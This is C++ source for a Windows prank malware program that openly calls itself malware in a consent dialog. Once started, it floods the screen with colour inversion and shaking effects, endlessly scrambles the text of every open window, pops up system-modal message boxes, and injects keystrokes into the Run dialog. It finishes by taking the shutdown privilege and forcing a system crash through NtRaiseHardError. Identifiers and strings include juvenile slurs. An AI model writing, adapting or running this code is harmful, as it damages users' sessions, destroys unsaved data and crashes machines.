#include "Include.h"


extern "C"
NTSTATUS NTAPI
RtlAdjustPrivilege(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrThread,
    PBOOLEAN StatusPointer);

extern "C"
NTSTATUS NTAPI
NtRaiseHardError(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ValidResponseOption,
    PULONG Response);

void rainb(std::atomic < bool >& quit_flag) {
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (!quit_flag) {
        COLORREF ColorRush = RGB(rand() % 255, rand() % 255, rand() % 255);
        HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(desk, hBrush);
        PatBlt(desk, 0, 0, sw, sh, PATINVERT);
        Sleep(100);
    }
}

std::string gen_random() {
    static
        const char x[] =
        "kids! racism! bored lol zzzdsahdygijoufhgfjoi";
    int len = 30;
    std::string STR;
    STR.reserve(len);
    for (int i = 0; i < len; ++i) {
        STR += x[rand() % (sizeof(x) - 1)];
    }
    return STR;
}

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

int x = rand() % (500);
int y = rand() % (700);

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_CREATEWND) {
        CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;

        if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
            HWND hwnd = (HWND)wParam;

            pcs->x = x;
            pcs->y = y;
        }

    }

    return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI ripMessageThread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    std::string lol = gen_random();
    std::string lol2 = gen_random();
    MessageBoxA(NULL, (LPCSTR)lol.c_str(), "fortnite borgor", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
    UnhookWindowsHookEx(hook);
    return 0;
}

void strReverseW(LPWSTR str) {
    int len = lstrlenW(str);
    if (len <= 1)
        return;
    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i + (rand() % 10)];
        str[i] = str[rand() % j];
        str[rand() % j] = c;
    }
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
        strReverseW(str);
        SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }
    GlobalFree(str);
    return TRUE;
}

int payloadChangeText() {
    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
    return 1;
}

int scrshake(std::atomic < bool >& quit_flag) {
    while (!quit_flag) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 5, rand() % 5, w, h, hdc, rand() % 5, rand() % 5, SRCCOPY);
        Sleep(10);
    }
    return 1;
}


// gaylol
int sus (void) {
    /* stupid setup */
    INPUT ip;
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0;
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;
    ip.ki.dwFlags = 0;
    ip.ki.wVk = VK_LWIN;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.wVk = 0x52;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &ip, sizeof(INPUT));
    ip.ki.wVk = VK_LWIN;
    SendInput(1, &ip, sizeof(INPUT));

    Sleep(10);

    INPUT _ip;
    _ip.type = INPUT_KEYBOARD;
    _ip.ki.wScan = 0;
    _ip.ki.time = 0;
    _ip.ki.dwExtraInfo = 0;
    _ip.ki.dwFlags = 0;
    _ip.ki.wVk = 0x53;
    SendInput(1, &_ip, sizeof(INPUT));
    _ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &_ip, sizeof(INPUT));

    Sleep(10);

    INPUT __ip;
    __ip.type = INPUT_KEYBOARD;
    __ip.ki.wScan = 0;
    __ip.ki.time = 0;
    __ip.ki.dwExtraInfo = 0;
    __ip.ki.dwFlags = 0;
    __ip.ki.wVk = 0x53;
    SendInput(1, &__ip, sizeof(INPUT));
    __ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &__ip, sizeof(INPUT));

    Sleep(100);

    INPUT ___ip;
    ___ip.type = INPUT_KEYBOARD;
    ___ip.ki.wScan = 0;
    ___ip.ki.time = 0;
    ___ip.ki.dwExtraInfo = 0;
    ___ip.ki.dwFlags = 0;
    ___ip.ki.wVk = 0x53;
    SendInput(1, &___ip, sizeof(INPUT));
    ___ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &___ip, sizeof(INPUT));

    Sleep(100);

    INPUT _____ip;
    _____ip.type = INPUT_KEYBOARD;
    _____ip.ki.wScan = 0;
    _____ip.ki.time = 0;
    _____ip.ki.dwExtraInfo = 0;
    _____ip.ki.dwFlags = 0;
    _____ip.ki.wVk = 0x55;
    SendInput(1, &_____ip, sizeof(INPUT));
    _____ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &_____ip, sizeof(INPUT));

    Sleep(100);

    INPUT ____ip;
    ____ip.type = INPUT_KEYBOARD;
    ____ip.ki.wScan = 0;
    ____ip.ki.time = 0;
    ____ip.ki.dwExtraInfo = 0;
    ____ip.ki.dwFlags = 0;
    ____ip.ki.wVk = 0x53;
    SendInput(1, &____ip, sizeof(INPUT));
    ____ip.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &____ip, sizeof(INPUT));

    INPUT lol;
    lol.type = INPUT_KEYBOARD;
    lol.ki.wScan = 0;
    lol.ki.time = 0;
    lol.ki.dwExtraInfo = 0;
    lol.ki.dwFlags = 0;
    lol.ki.wVk = VK_SHIFT;
    SendInput(1, &lol, sizeof(INPUT));

    INPUT lol_;
    lol_.type = INPUT_KEYBOARD;
    lol_.ki.wScan = 0;
    lol_.ki.time = 0;
    lol_.ki.dwExtraInfo = 0;
    lol_.ki.dwFlags = 0;
    lol_.ki.wVk = VK_OEM_1;
    SendInput(1, &lol_, sizeof(INPUT));
    SendInput(1, &lol_, sizeof(INPUT));
    lol_.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &lol_, sizeof(INPUT));

    Sleep(10);
    lol.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &lol, sizeof(INPUT));

    INPUT entering;
    entering.type = INPUT_KEYBOARD;
    entering.ki.wScan = 0;
    entering.ki.time = 0;
    entering.ki.dwExtraInfo = 0;
    entering.ki.dwFlags = 0;
    entering.ki.wVk = VK_RETURN;
    SendInput(1, &entering, sizeof(INPUT));
    entering.ki.dwFlags = KEYEVENTF_KEYUP;
    SendInput(1, &entering, sizeof(INPUT));

    return 0x444;

}


void gay
(
    void
) {
    while (true)
        payloadChangeText();
}
int WINAPI wWinMain(
    __in HINSTANCE hInstance,
    __in_opt HINSTANCE hPrevInstance,
    __in LPWSTR lpCmdLine,
    __in int nShowCmd
) {


    if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\n\
If you have real data on your machine, or simply don't want to execute this program, press No.\n\
If you do want to execute, press Yes at your own risk.", "Malware Alert!", MB_YESNO | MB_ICONWARNING) != IDYES) {
        ExitProcess(0);
    }


    Sleep(1000);
    GTDesktop();
    HDC __hdc;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    for (int gay = 0; gay < 50; gay++) {
        __hdc = GetDC(0);
        BitBlt(
            __hdc, rand() % 2, rand() % 2, w, h, __hdc,
            rand() % 2, rand() % 2, SRCAND);
        Sleep(1000);
    }
    GTDesktop();
    Sleep(1000);
    GTDesktop();
    Sleep(10);
    std::atomic_bool quit_flag(false);
    std::atomic_bool delayed_quit_flag(false);
    std::atomic_bool ddelayed_quit_flag(false);
    srand((unsigned int)time(NULL));
    thread a(ScrMove, std::ref(quit_flag));
    Sleep(1000);
    thread b(rainb, std::ref(delayed_quit_flag));
    Sleep(1000);
    thread c(scrshake, std::ref(ddelayed_quit_flag));
    thread SomeTrolling(gay);
    Sleep(10000);
    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
    ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
    quit_flag = true;
    for (int i = 0; i < 10; i++) {
        CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
        Sleep(500);
        x = rand() % (1920);
        y = rand() % (1080);
    }
    ddelayed_quit_flag = true;
    sus();
    ShellExecuteA(NULL, "open", "ribbons.scr", NULL, NULL, 10);
    ShellExecuteA(NULL, "open", "ribbons.scr", NULL, NULL, 10);
    Sleep(3000);
    Glitch();
    delayed_quit_flag = true;
    Sleep(10000);
    BOOLEAN bl;
    unsigned long response;
    RtlAdjustPrivilege(19, true, false, &bl);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE,
        0, 0, 0, 6, &response);
    
    ExitProcess(1);
    return 1;
}
